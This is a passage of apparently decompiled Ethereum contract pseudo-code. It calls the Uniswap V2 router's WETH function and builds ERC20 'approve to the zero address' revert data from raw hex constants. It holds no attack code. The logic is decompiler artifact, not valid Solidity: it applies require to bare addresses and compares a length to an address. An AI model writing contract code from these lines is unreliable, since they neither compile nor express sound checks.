        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).WETH(var_i); // staticcall
        var_e = var_e + (uint248(ret0.length + 0x1f));
        require(!(((var_e + ret0.length) - var_e) < 0x20), "ERC20: approve to the zero address");
        require(var_e.length == (address(var_e.length)), "ERC20: approve to the zero address");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x32;
        var_j = address(var_e.length);
        require(address(this), "ERC20: approve to the zero address");
        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, "ERC20: approve to the zero address");
        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_l = 0x20;
        var_m = 0x22;
        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_l = 0x20;
        var_m = 0x24;
        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
}